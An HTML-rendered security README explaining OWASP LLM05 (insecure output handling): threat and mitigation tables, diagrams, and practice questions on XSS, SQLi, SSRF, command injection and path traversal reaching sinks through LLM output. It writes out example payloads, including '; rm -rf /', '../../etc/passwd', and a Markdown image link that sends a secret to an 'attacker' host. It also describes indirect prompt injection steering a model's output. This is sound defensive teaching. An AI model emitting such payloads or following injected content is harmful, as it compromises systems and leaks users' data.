@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Insecure Output Handling (OWASP LLM05)</title>
+
+  <!-- Mermaid JS (CDN). Render lazily so very large pages stay scrollable. -->
+  <script type="module">
+    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+    mermaid.initialize({ startOnLoad: false, theme: 'neutral' });
+
+    function renderMermaidBlock(el) {
+      if (el.dataset.mermaidState) return;
+      el.dataset.mermaidState = 'rendering';
+      mermaid.run({ nodes: [el] })
+        .then(function () {
+          el.dataset.mermaidState = 'rendered';
+        })
+        .catch(function (err) {
+          el.dataset.mermaidState = 'error';
+          el.classList.add('mermaid-error');
+          console.error('Mermaid render failed:', err);
+        });
+    }
+
+    function initMermaidLazyRender() {
+      var blocks = Array.prototype.slice.call(document.querySelectorAll('.mermaid'));
+      if (!blocks.length) return;
+
+      if ('IntersectionObserver' in window) {
+        var observer = new IntersectionObserver(function (entries) {
+          entries.forEach(function (entry) {
+            if (!entry.isIntersecting) return;
+            observer.unobserve(entry.target);
+            renderMermaidBlock(entry.target);
+          });
+        }, { rootMargin: '800px 0px', threshold: 0.01 });
+
+        blocks.forEach(function (block) {
+          observer.observe(block);
+        });
+      } else {
+        var index = 0;
+        function renderBatch() {
+          blocks.slice(index, index + 8).forEach(renderMermaidBlock);
+          index += 8;
+          if (index < blocks.length) window.setTimeout(renderBatch, 50);
+        }
+        renderBatch();
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initMermaidLazyRender);
+    } else {
+      initMermaidLazyRender();
+    }
+  </script>
+
+  <!-- Syntax highlighting (optional, no build step required) -->
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <style>
+    *  { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      line-height: 1.7;
+      color: #24292f;
+      background: #fff;
+    }
+
+    /* Typography */
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.6em;
+      margin-bottom: 0.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      font-weight: 600;
+    }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    a { color: #0969da; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* Code */
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    code {
+      background: #f6f8fa;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.9em;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+      border-radius: 0;
+    }
+
+    /* Tables */
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 16px 0;
+      font-size: 0.92em;
+    }
+    th, td {
+      border: 1px solid #d0d7de;
+      padding: 8px 14px;
+      text-align: left;
+      vertical-align: top;
+    }
+    th {
+      background: #f6f8fa;
+      font-weight: 600;
+    }
+    tr:nth-child(even) { background: #f9f9f9; }
+
+    /* Blockquotes */
+    blockquote {
+      border-left: 4px solid #d0d7de;
+      margin: 0 0 16px 0;
+      padding: 8px 16px;
+      color: #57606a;
+      background: #f6f8fa;
+      border-radius: 0 6px 6px 0;
+    }
+
+    /* Mermaid diagrams */
+    .mermaid {
+      background: #fafbfc;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 20px;
+      margin: 20px 0;
+      overflow-x: auto;
+      text-align: center;
+    }
+    pre.mermaid {
+      white-space: pre;
+    }
+    .mermaid svg {
+      max-width: 100%;
+      height: auto;
+    }
+    .mermaid[data-mermaid-state="rendering"] {
+      min-height: 140px;
+    }
+    .mermaid-error {
+      text-align: left;
+      color: #57606a;
+    }
+
+    /* Images */
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      margin: 14px 0;
+      border: 1px solid #d0d7de;
+      background: #fff;
+      cursor: zoom-in;
+      display: block;
+    }
+
+    /* ── Image zoom overlay ─────────────────────────────── */
+    #img-zoom-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.82);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    #img-zoom-overlay.active { display: flex; }
+    #img-zoom-wrap {
+      position: relative;
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: grab;
+    }
+    #img-zoom-wrap.dragging { cursor: grabbing; }
+    #img-zoom-el {
+      max-width: none;
+      max-height: none;
+      border: none;
+      margin: 0;
+      border-radius: 4px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.6);
+      transform-origin: center center;
+      user-select: none;
+      pointer-events: none;
+    }
+    #img-zoom-controls {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      background: rgba(20,20,20,0.88);
+      padding: 7px 18px;
+      border-radius: 24px;
+      z-index: 10000;
+    }
+    #img-zoom-controls button {
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.1em;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.15s;
+    }
+    #img-zoom-controls button:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-level {
+      color: #ccc;
+      font-size: 0.82em;
+      min-width: 46px;
+      text-align: center;
+      font-family: monospace;
+    }
+    #img-zoom-close {
+      position: fixed;
+      top: 16px;
+      right: 20px;
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.3em;
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      transition: background 0.15s;
+    }
+    #img-zoom-close:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-hint {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: rgba(200,200,200,0.7);
+      font-size: 0.76em;
+      font-family: -apple-system, sans-serif;
+      z-index: 10000;
+      pointer-events: none;
+    }
+
+    /* Breadcrumb / path */
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 24px;
+      font-family: monospace;
+    }
+
+    /* Horizontal rule */
+    hr { border: none; border-top: 2px solid #d0d7de; margin: 24px 0; }
+  </style>
+</head>
+<body>
+  <p class="file-path">Source: ai_security\LLM-Attacks\Insecure-Output-Handling\README.md</p>
+<h1 id="insecure-output-handling-owasp-llm05">Insecure Output Handling (OWASP LLM05)</h1>
+<p><strong>Domain:</strong> AI / LLM Application Security<br />
+<strong>Frameworks:</strong> OWASP Top 10 for LLM Applications — <strong>LLM05: Improper Output Handling</strong> · MITRE ATLAS (AML.T0051 LLM Prompt Injection chained to downstream execution) · Google SAIF (Input/Output validation controls) · NIST AI RMF (MEASURE / MANAGE)</p>
+<h2 id="overview">Overview</h2>
+<p>Insecure output handling is the failure to treat an LLM's response as <strong>untrusted input</strong> before it is rendered, executed, or forwarded to a downstream component. The model output crosses a trust boundary into a browser, database, shell, HTTP client, template engine, or file system, and if that sink applies no validation or encoding, the LLM effectively becomes an injection vector for classic web vulnerabilities: XSS, SQL injection, SSRF, OS command injection, and path traversal. This matters because the LLM's output is influenced by attacker-controllable inputs — the user prompt, retrieved RAG documents, and tool results — so an attacker who can steer the model can smuggle a payload straight into a privileged sink. OWASP classifies it as <strong>LLM05: Improper Output Handling</strong>, distinct from LLM01 (Prompt Injection, the input side) and LLM02 (Sensitive Information Disclosure). The one-line mental model: <strong>prompt injection is how you steer the model; insecure output handling is how that steering reaches a dangerous sink.</strong></p>
+<h2 id="how-it-works">How It Works</h2>
+<h3 id="core-mechanics">Core Mechanics</h3>
+<p>A production LLM app rarely returns the model's text straight to a human who reads it inertly. The output is consumed by another component that acts on it: a front end renders it as HTML/Markdown, a code path parses JSON and builds a SQL query, an agent passes it to a tool that makes an HTTP request, or a plugin executes it as shell or code. Each of these is a <strong>sink</strong>, and each sink has a language it interprets — HTML, SQL, a URL grammar, a shell, a path. Insecure output handling is what happens when text is placed into that sink without being encoded or validated for that language.</p>
+<p>The critical trust-boundary error is treating LLM output as trusted because it came from "our own model." It is not trusted. The model is a <strong>transformer of untrusted inputs into plausible-looking output</strong> — it does not sanitize, and it will faithfully emit <code>&lt;script&gt;</code>, <code>'; DROP TABLE</code>, <code>http://169.254.169.254/</code>, <code>; rm -rf /</code>, or <code>../../etc/passwd</code> if the surrounding context nudges it there. The attacker's capability is influence over any input that reaches the context window: the direct prompt, an indirect payload planted in a web page or document that RAG later retrieves, or a poisoned tool result. Their objective is to have the model emit a string that the downstream sink will interpret as code or a command rather than as data. This is the same confused-deputy pattern as classic injection, with the LLM inserted as an intermediary that launders attacker input into "internal" output.</p>
+<p>The defense is symmetric to classic web security: apply the sink-appropriate control at the boundary <strong>where output enters the sink</strong>, not at the model. Each downstream injection maps to a well-understood web-vuln control — contextual output encoding for XSS, parameterized queries for SQLi, egress allowlists for SSRF, argument arrays and sandboxing for command injection, canonicalization plus allowlists for path traversal. Because the model itself provides no guarantees, the boundary control is the control.</p>
+<h3 id="step-by-step-flow">Step-by-Step Flow</h3>
+<h4 id="diagram-a-attack-path-from-prompt-to-downstream-sink">Diagram A — Attack Path from Prompt to Downstream Sink</h4>
+<pre class="mermaid">
+sequenceDiagram
+    participant A as Attacker
+    participant U as User App
+    participant M as Model
+    participant S as Downstream Sink
+    participant V as Victim
+    A->>U: Poisoned input or document
+    U->>M: Prompt plus retrieved content
+    M-->>U: Output with embedded payload
+    U->>S: Render or execute raw output
+    S-->>V: XSS or SQLi or SSRF fires
+    V-->>A: Cookie or data exfiltrated
+</pre>
+<h4 id="diagram-b-trust-boundary-and-control-point">Diagram B — Trust Boundary and Control Point</h4>
+<pre class="mermaid">
+flowchart TD
+    A[User prompt] --> C[Context window]
+    B[Retrieved docs and tool results] --> C
+    C --> M[Model inference]
+    M --> O[Model output treated as untrusted]
+    O --> G{Sink-specific validation}
+    G -->|encode or parameterize or allowlist| S[Safe sink execution]
+    G -->|no validation| X[Injection in browser db shell or client]
+</pre>
+<h4 id="diagram-c-mapping-each-sink-to-its-classic-web-control">Diagram C — Mapping Each Sink to Its Classic Web Control</h4>
+<pre class="mermaid">
+flowchart LR
+    O[LLM output] --> H[HTML render]
+    O --> Q[SQL query]
+    O --> R[HTTP client]
+    O --> P[Shell exec]
+    O --> F[File path]
+    H --> HC[Contextual output encoding and CSP]
+    Q --> QC[Parameterized queries]
+    R --> RC[Egress allowlist and no internal IPs]
+    P --> PC[Arg array and sandbox no shell]
+    F --> FC[Canonicalize and path allowlist]
+</pre>
+<h2 id="what-can-go-wrong">What Can Go Wrong</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Threat / Attack</th>
+<th>Framework ID</th>
+<th>Root Cause</th>
+<th>Impact</th>
+<th>Likelihood</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Stored/reflected XSS via rendered output</td>
+<td>LLM05 / LLM01</td>
+<td>Model output injected into DOM as HTML without encoding</td>
+<td>Session theft, account takeover, worming across chat history</td>
+<td>High</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Markdown image/link exfiltration</td>
+<td>LLM05</td>
+<td>Rendered Markdown auto-loads attacker URL with data in query string</td>
+<td>Silent data exfil (prompt, PII) via image beacon</td>
+<td>High</td>
+</tr>
+<tr>
+<td>3</td>
+<td>SQL injection from model-built queries</td>
+<td>LLM05</td>
+<td>LLM output concatenated into SQL instead of parameterized</td>
+<td>Data theft, tampering, RCE on some DBs</td>
+<td>High</td>
+</tr>
+<tr>
+<td>4</td>
+<td>OS command injection via tool/plugin</td>
+<td>LLM05 / LLM06</td>
+<td>Output passed to a shell or <code>eval</code> in an agent tool</td>
+<td>Full host compromise, lateral movement</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>5</td>
+<td>SSRF via model-supplied URL</td>
+<td>LLM05</td>
+<td>Agent fetches a URL the model emitted, no egress control</td>
+<td>Cloud metadata theft, internal service access</td>
+<td>High</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Path traversal / arbitrary file read</td>
+<td>LLM05</td>
+<td>Output used as a file path with no canonicalization</td>
+<td>Secret/file disclosure or overwrite</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Indirect injection driving the payload</td>
+<td>LLM01 (source) → LLM05 (sink)</td>
+<td>Poisoned RAG doc or web page steers output</td>
+<td>Attacker controls sink payload without direct access</td>
+<td>High</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Template / SSTI injection</td>
+<td>LLM05</td>
+<td>Output rendered by a server-side template engine</td>
+<td>RCE via template evaluation</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Code execution in notebook/code-interpreter</td>
+<td>LLM05 / LLM06</td>
+<td>Output run as code with no sandbox</td>
+<td>Arbitrary code execution, data exfil</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>10</td>
+<td>CSV / formula injection</td>
+<td>LLM05</td>
+<td>Output written to a spreadsheet cell starting with <code>=</code></td>
+<td>Client-side command exec on export open</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>11</td>
+<td>Response splitting / header injection</td>
+<td>LLM05</td>
+<td>Output placed into HTTP headers unescaped</td>
+<td>Cache poisoning, redirect</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>12</td>
+<td>Trusting output for authz decisions</td>
+<td>LLM05 / LLM06</td>
+<td>Downstream grants access based on model text</td>
+<td>Privilege escalation, broken access control</td>
+<td>Med</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mitigation-controls">Mitigation Controls</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Threat</th>
+<th>Mitigation</th>
+<th>Control Point / Where Applied</th>
+<th>Framework</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>XSS</td>
+<td>Contextual output encoding, render as plain text, strict CSP, sanitize Markdown/HTML</td>
+<td>Front end at render boundary</td>
+<td>SAIF output validation / NIST MANAGE</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Markdown exfil</td>
+<td>Disable auto-loading images, allowlist link/image domains, strip data-bearing URLs</td>
+<td>Renderer</td>
+<td>SAIF</td>
+</tr>
+<tr>
+<td>3</td>
+<td>SQLi</td>
+<td>Parameterized queries / prepared statements; never concatenate model text into SQL</td>
+<td>Data access layer</td>
+<td>SAIF / NIST MEASURE</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Command injection</td>
+<td>Pass args as arrays (no shell string), drop <code>eval</code>, sandbox tool execution</td>
+<td>Agent tool layer</td>
+<td>SAIF sandboxing</td>
+</tr>
+<tr>
+<td>5</td>
+<td>SSRF</td>
+<td>Egress allowlist, block RFC1918 and link-local, disable redirects, block metadata IP</td>
+<td>HTTP client / egress proxy</td>
+<td>SAIF / NIST MANAGE</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Path traversal</td>
+<td>Canonicalize path, enforce base-dir allowlist, reject <code>..</code> and absolute paths</td>
+<td>File I/O layer</td>
+<td>SAIF</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Indirect injection</td>
+<td>Treat retrieved content as untrusted; still validate at every sink</td>
+<td>Retrieval + sink</td>
+<td>OWASP LLM01/LLM05</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Excessive trust</td>
+<td>Least privilege for tools, human-in-the-loop for high-impact actions</td>
+<td>Agent authorization</td>
+<td>OWASP LLM06 / SAIF</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Schema drift</td>
+<td>Constrain output to a strict schema, validate before use, reject on parse failure</td>
+<td>Output parser</td>
+<td>NIST MEASURE</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Code exec</td>
+<td>Run generated code only in an isolated, network-limited sandbox</td>
+<td>Execution environment</td>
+<td>SAIF sandboxing</td>
+</tr>
+<tr>
+<td>11</td>
+<td>Blind trust everywhere</td>
+<td>Encode/validate per-sink by default; deny-by-default sinks</td>
+<td>Every downstream boundary</td>
+<td>Defense in depth</td>
+</tr>
+<tr>
+<td>12</td>
+<td>Authz via output</td>
+<td>Enforce access control in code, never delegate authz to the model</td>
+<td>Application authz</td>
+<td>OWASP LLM06</td>
+</tr>
+</tbody>
+</table>
+<h3 id="top-3-critical-mitigations">Top 3 Critical Mitigations</h3>
+<h4 id="1-treat-output-as-untrusted-and-encodevalidate-at-every-sink">1. Treat Output as Untrusted and Encode/Validate at Every Sink</h4>
+<p>The foundational control is a mindset made concrete: the LLM is downstream of untrusted input, so its output is untrusted input to whatever consumes it. Apply the <strong>sink-appropriate</strong> control at the point the output enters the sink — contextual output encoding for HTML (encode <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code> for the exact context: HTML body, attribute, JS, URL), parameterized queries for SQL, allowlists for URLs and file paths, and argument arrays for process execution. This is not model-side filtering; it is the same boundary discipline that defends any web app, applied at the LLM-to-sink boundary. The trade-off is that encoding must be context-correct — encoding for HTML body but injecting into a JS string context still yields XSS — so the control has to know the exact sink grammar, and blanket "sanitization" is a common failure. The strength is that, unlike guardrails, output encoding is a <strong>sound</strong> control: correctly encoded data provably cannot break out of its context.</p>
+<h4 id="2-prefer-structured-constrained-output-over-free-form-text">2. Prefer Structured, Constrained Output over Free-Form Text</h4>
+<p>Instead of taking raw model prose and interpolating it into a sink, force the model to emit a <strong>strict schema</strong> (JSON with a validated shape, or an enum of allowed actions) and validate that structure before any use. A model that returns <code>{"action": "search", "query": "..."}</code> against a strict validator cannot directly emit <code>&lt;script&gt;</code> into a rendered field, and a tool that accepts only an enumerated action from a fixed set cannot be coerced into an arbitrary shell command. Combine this with least-privilege tool scopes so that even a valid-looking action can only do a narrowly bounded thing. The trade-off is reduced flexibility and the need to handle validation failures gracefully (reject and retry rather than "best effort" parse), but it dramatically shrinks the injection surface by removing free-form text from the dangerous path. This aligns with SAIF's input/output validation and NIST AI RMF's MEASURE function.</p>
+<h4 id="3-sandbox-and-least-privilege-the-sinks-themselves">3. Sandbox and Least-Privilege the Sinks Themselves</h4>
+<p>Assume a payload will sometimes get through and limit the blast radius. Run any code, shell, or tool the LLM can drive inside an <strong>isolated sandbox</strong> — a container or microVM with no ambient credentials, no access to the cloud metadata endpoint, an egress allowlist (or no network), read-only mounts, and a scoped, short-lived token. Add human-in-the-loop confirmation for high-impact actions (writes, payments, deletions, outbound requests to new domains). This is the containment layer behind the boundary controls: output encoding stops the injection, but sandboxing ensures that if command injection or SSRF does fire, it reaches nothing valuable. The trade-off is operational complexity and latency, and the standard caveat that sandboxes and guardrails are <strong>probabilistic, not sound</strong> — a determined attacker may find an escape — which is exactly why this is defense in depth on top of, not instead of, sink-side encoding. Relevant tooling: gVisor/Firecracker for isolation, egress proxies with allowlists, and output-scanning guardrails (Llama Guard, NeMo Guardrails) as a supplementary, not primary, layer.</p>
+<h2 id="practice-questions">Practice Questions</h2>
+<h3 id="tier-1-fundamentals">Tier 1 — Fundamentals</h3>
+<ol>
+<li><strong>What is insecure output handling and why is it OWASP LLM05?</strong> It is failing to validate or encode an LLM's output before a downstream component renders or executes it, turning the model into an injection vector for XSS, SQLi, SSRF, command injection, or path traversal. It is LLM05 because it is the output-side counterpart to LLM01 prompt injection. This is asked to confirm you know LLM output is untrusted input to the next component.</li>
+<li><strong>Why should you treat LLM output as untrusted?</strong> The model transforms attacker-influenceable inputs (prompts, RAG docs, tool results) into output and provides no sanitization guarantee, so its output can carry payloads. This is asked to test the core trust-boundary intuition.</li>
+<li><strong>Give a concrete XSS example from an LLM app.</strong> A chatbot renders the model's Markdown/HTML answer directly into the DOM; an attacker gets the model to emit <code>&lt;script&gt;</code> (or an image tag with a data-bearing URL) and steals the session. This is asked to see if you can map the abstract risk to a real sink.</li>
+<li><strong>How is LLM05 different from LLM01?</strong> LLM01 is manipulating the model via input; LLM05 is the model's output reaching a dangerous sink without validation. One is the steering, the other is the impact path. This is asked to check you can separate cause from effect.</li>
+<li><strong>What is the classic control for output rendered as HTML?</strong> Contextual output encoding plus a strict Content Security Policy, and rendering as plain text where possible. This is asked to confirm you reach for standard web controls, not model-side hacks.</li>
+</ol>
+<h3 id="tier-2-system-design-and-trade-offs">Tier 2 — System Design and Trade-offs</h3>
+<ol>
+<li><strong>Design safe output handling for a customer-facing chatbot whose answers render in a browser.</strong> Never trust the model output: render as plain text or run it through a strict HTML/Markdown sanitizer with an allowlist, apply contextual output encoding per context, set a strict CSP, disable auto-loading of remote images to stop Markdown exfil, and allowlist any link domains. Keep the control at the render boundary in the front end, and add output guardrails only as a secondary layer. This is asked to see if you apply web-security fundamentals at the LLM boundary rather than trusting the model.</li>
+<li><strong>An agent builds SQL from user questions. How do you prevent SQLi?</strong> Do not let the model emit raw SQL that you concatenate; have it emit structured parameters (filters, fields) against a fixed, parameterized query template, and validate those against an allowlist of columns/operations. Enforce least-privilege DB credentials so even a successful injection is bounded. This is asked to test whether you know parameterization is the sound control and that structured output shrinks the surface.</li>
+<li><strong>Your agent fetches URLs the model provides. How do you stop SSRF?</strong> Route all egress through a proxy with a domain allowlist, block RFC1918/link-local and the cloud metadata IP (169.254.169.254), disable redirects, and resolve-then-pin the IP to avoid DNS rebinding. Run the fetcher with no ambient cloud credentials. This is asked to test SSRF depth in an agentic context, including metadata-endpoint theft.</li>
+<li><strong>How does indirect prompt injection make output handling worse?</strong> A poisoned RAG document or web page steers the model to emit a payload, so the attacker controls the sink input without ever touching the prompt directly — the untrusted content is laundered through your "trusted" model. The fix is still sink-side validation, because you cannot rely on cleaning the input. This is asked to connect the input and output sides of the threat model.</li>
+<li><strong>Where do you put the control — at the model or at the sink? Why?</strong> At the sink, because the model gives no soundness guarantee and probabilistic output filters can be bypassed, whereas correct output encoding and parameterization are provably safe at the boundary. Model-side guardrails are a supplementary layer. This is asked to test whether you understand sound vs probabilistic controls.</li>
+</ol>
+<h3 id="tier-3-expert-and-deep-dive">Tier 3 — Expert and Deep-Dive</h3>
+<ol>
+<li><strong>Why can output encoding still fail even when you "sanitize"?</strong> Encoding must match the exact sink context; encoding for HTML body but interpolating into a JavaScript string, an HTML attribute, or a URL context leaves an exploitable break-out. Context confusion, not missing encoding, is the usual real-world XSS root cause. This is asked to see if you understand contextual encoding at depth rather than as a checkbox.</li>
+<li><strong>How would you architect a code-interpreter feature the LLM can drive, assuming payloads will get through?</strong> Execute only in an isolated microVM/container with no network (or a strict egress allowlist), no ambient credentials, no metadata access, read-only mounts, a scoped short-lived token, and resource limits, with human confirmation for high-impact actions. Combine sandbox containment with output validation so a breakout still reaches nothing valuable. This is asked to test defense-in-depth and blast-radius thinking for the highest-impact sink.</li>
+<li><strong>Compare constraining output to a schema versus filtering free-form text.</strong> Schema constraint with strict validation is deterministic — you reject anything that does not parse to the allowed shape, removing free-form text from the dangerous path — whereas post-hoc filtering of prose is probabilistic and racing an adversary who can encode or obfuscate payloads. Schema-plus-least-privilege scopes the model to an enumerated set of safe actions. This is asked to test whether you prefer sound structural controls over pattern matching.</li>
+<li><strong>How can Markdown rendering leak data with no visible XSS?</strong> A rendered <code>![img](https://attacker/x?d=&lt;secret&gt;)</code> auto-loads the attacker URL with exfiltrated data in the query string; no script runs, so CSP script rules and XSS filters miss it. Mitigate by disabling remote image auto-load and allowlisting image/link domains. This is asked to probe subtle exfiltration channels beyond textbook XSS.</li>
+<li><strong>In a multi-agent system, agent A's output feeds agent B's tools. Where are the boundaries?</strong> Every inter-agent hop is a trust boundary: treat A's output as untrusted input to B, validate/constrain it to B's expected schema before B acts, and apply least-privilege tool scopes and sandboxing per agent so a payload cannot chain across the pipeline. Do not assume "internal" agents are trusted. This is asked to test trust-boundary reasoning in composed agentic systems.</li>
+</ol>
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>LLM output is <strong>untrusted input</strong> to the next component — encode, validate, or parameterize it at every sink, exactly as you would any user input.</li>
+<li>It is <strong>OWASP LLM05 (Improper Output Handling)</strong>, the output-side counterpart to LLM01 prompt injection; injection often starts as LLM01 and lands as LLM05.</li>
+<li>Each downstream sink maps to a <strong>classic web-vuln control</strong>: contextual output encoding + CSP for XSS, parameterized queries for SQLi, egress allowlists for SSRF, argument arrays + sandboxing for command injection, canonicalization + allowlists for path traversal.</li>
+<li>Put the control <strong>at the sink boundary</strong>, not the model — output encoding and parameterization are <strong>sound</strong>; model-side guardrails are <strong>probabilistic</strong> and only supplementary.</li>
+<li><strong>Constrain output to a strict schema</strong> and enforce least-privilege tool scopes to remove free-form text from dangerous paths.</li>
+<li><strong>Sandbox the sinks</strong> (no ambient creds, no metadata access, egress allowlist, human-in-the-loop for high-impact actions) so a payload that slips through reaches nothing valuable.</li>
+<li>Indirect injection via RAG/tool content means you cannot trust the input either — <strong>sink-side validation is the durable defense</strong>.</li>
+<li>Production one-liner: <em>treat every LLM output as attacker-controlled and apply the sink-appropriate encoding/validation at each downstream boundary, backed by least privilege and sandboxing.</em></li>
+</ul>
+
+  <!-- ── Image zoom overlay ───────────────────────────── -->
+  <div id="img-zoom-overlay">
+    <div id="img-zoom-wrap">
+      <img id="img-zoom-el" src="" alt="">
+    </div>
+    <div id="img-zoom-controls">
+      <button id="zoom-out-btn"  title="Zoom out (scroll down / minus)">&#8722;</button>
+      <span   id="img-zoom-level">100%</span>
+      <button id="zoom-in-btn"   title="Zoom in (scroll up / plus)">&#43;</button>
+      <button id="zoom-reset-btn" title="Reset (key: 0)">&#8635;</button>
+    </div>
+    <button id="img-zoom-close" title="Close (Esc)">&#10005;</button>
+    <span   id="img-zoom-hint">Scroll to zoom &nbsp;·&nbsp; Drag to pan &nbsp;·&nbsp; Esc to close</span>
+  </div>
+
+  <script>
+  (function () {
+    var overlay   = document.getElementById('img-zoom-overlay');
+    var wrap      = document.getElementById('img-zoom-wrap');
+    var zoomEl    = document.getElementById('img-zoom-el');
+    var levelEl   = document.getElementById('img-zoom-level');
+    var closeBtn  = document.getElementById('img-zoom-close');
+    var btnIn     = document.getElementById('zoom-in-btn');
+    var btnOut    = document.getElementById('zoom-out-btn');
+    var btnReset  = document.getElementById('zoom-reset-btn');
+
+    var scale = 1, tx = 0, ty = 0;
+    var MIN = 0.15, MAX = 12, STEP = 0.2;
+
+    function applyTransform() {
+      zoomEl.style.transform =
+        'translate(' + tx + 'px,' + ty + 'px) scale(' + scale + ')';
+      levelEl.textContent = Math.round(scale * 100) + '%';
+    }
+
+    function openOverlay(src, alt) {
+      zoomEl.src = src;
+      zoomEl.alt = alt || '';
+      scale = 1; tx = 0; ty = 0;
+      applyTransform();
+      overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeOverlay() {
+      overlay.classList.remove('active');
+      document.body.style.overflow = '';
+      zoomEl.src = '';
+    }
+
+    // Wire click on every page image.
+    // Uses closest('a') so anchor wrappers at ANY ancestor depth are caught.
+    // Standalone images (no ancestor <a>) get the listener on the <img> itself.
+    document.querySelectorAll('img:not(#img-zoom-el)').forEach(function (img) {
+      var anchor = img.closest('a');
+      if (anchor) {
+        anchor.style.cursor = 'zoom-in';
+        anchor.addEventListener('click', function (e) {
+          e.preventDefault();
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      } else {
+        img.style.cursor = 'zoom-in';
+        img.addEventListener('click', function (e) {
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      }
+    });
+
+    closeBtn.addEventListener('click', closeOverlay);
+    overlay.addEventListener('click', function (e) {
+      if (e.target === overlay || e.target === wrap) closeOverlay();
+    });
+
+    document.addEventListener('keydown', function (e) {
+      if (!overlay.classList.contains('active')) return;
+      if (e.key === 'Escape') { closeOverlay(); return; }
+      if (e.key === '+' || e.key === '=') { scale = Math.min(MAX, scale + STEP); applyTransform(); }
+      if (e.key === '-')                  { scale = Math.max(MIN, scale - STEP); applyTransform(); }
+      if (e.key === '0')                  { scale = 1; tx = 0; ty = 0; applyTransform(); }
+    });
+
+    btnIn.addEventListener('click',    function () { scale = Math.min(MAX, scale + STEP); applyTransform(); });
+    btnOut.addEventListener('click',   function () { scale = Math.max(MIN, scale - STEP); applyTransform(); });
+    btnReset.addEventListener('click', function () { scale = 1; tx = 0; ty = 0; applyTransform(); });
+
+    // Scroll-wheel zoom (zoom towards cursor)
+    wrap.addEventListener('wheel', function (e) {
+      e.preventDefault();
+      var rect  = wrap.getBoundingClientRect();
+      var cx    = e.clientX - rect.left  - rect.width  / 2;
+      var cy    = e.clientY - rect.top   - rect.height / 2;
+      var delta = e.deltaY < 0 ? STEP : -STEP;
+      var newScale = Math.min(MAX, Math.max(MIN, scale + delta));
+      var ratio    = newScale / scale;
+      tx = cx + ratio * (tx - cx);
+      ty = cy + ratio * (ty - cy);
+      scale = newScale;
+      applyTransform();
+    }, { passive: false });
+
+    // Mouse drag to pan
+    var dragging = false, dsx = 0, dsy = 0, stx = 0, sty = 0;
+    wrap.addEventListener('mousedown', function (e) {
+      dragging = true; wrap.classList.add('dragging');
+      dsx = e.clientX; dsy = e.clientY;
